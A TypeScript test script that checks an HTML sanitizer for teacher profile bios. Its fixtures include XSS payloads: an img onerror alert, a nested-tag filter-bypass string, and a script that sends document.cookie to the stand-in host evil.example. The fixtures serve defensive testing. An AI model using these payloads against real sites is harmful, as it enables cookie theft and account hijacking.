import { stripHtml, sanitizeOrFallback } from "./sanitize";

let pass = 0;
let fail = 0;

function assertEq(actual: unknown, expected: unknown, label: string) {
  const ok = JSON.stringify(actual) === JSON.stringify(expected);
  if (ok) {
    pass++;
    console.log(`PASS  ${label}`);
  } else {
    fail++;
    console.log(`FAIL  ${label}`);
    console.log(`      expected: ${JSON.stringify(expected)}`);
    console.log(`      actual:   ${JSON.stringify(actual)}`);
  }
}

// Plain text passes through unchanged
assertEq(stripHtml("Experienced Spanish teacher, 5 years"), "Experienced Spanish teacher, 5 years", "plain text unchanged");

// null/undefined/empty
assertEq(stripHtml(null), "", "null -> empty string");
assertEq(stripHtml(undefined), "", "undefined -> empty string");
assertEq(stripHtml(""), "", "empty string -> empty string");

// Classic script tag XSS payload from the audit report
assertEq(stripHtml("<img src=x onerror=\"alert('xss')\">"), "", "img onerror payload fully stripped");
assertEq(stripHtml("<script>alert(1)</script>"), "alert(1)", "script tags stripped, inert text remains");

// Bio with legitimate-looking text plus an injected payload in the middle
assertEq(
  stripHtml("Hi I'm Maria <script>document.location='http://evil.example/steal?c='+document.cookie</script> I teach French"),
  "Hi I'm Maria document.location='http://evil.example/steal?c='+document.cookie I teach French",
  "payload embedded mid-bio: tags removed, surrounding text preserved"
);

// Malformed/nested tags designed to survive a single non-iterative regex pass
assertEq(stripHtml("<<script>alert(1)<</script>>"), "alert(1)", "nested/malformed tag survives only after iterative stripping");

// Multiple separate tags
assertEq(stripHtml("<b>Bold</b> and <i>italic</i>"), "Bold and italic", "multiple simple tags stripped, text kept");

// Whitespace trimming
assertEq(stripHtml("   <p>padded</p>   "), "padded", "surrounding whitespace trimmed after tag strip");

// sanitizeOrFallback
assertEq(sanitizeOrFallback(null, "Experienced Spanish teacher"), "Experienced Spanish teacher", "fallback used when input is null");
assertEq(sanitizeOrFallback("<script></script>", "fallback"), "fallback", "fallback used when sanitized result is empty");
assertEq(sanitizeOrFallback("<b>Real bio</b>", "fallback"), "Real bio", "real content wins over fallback");

console.log(`\n${pass} passed, ${fail} failed`);
if (fail > 0) process.exit(1);
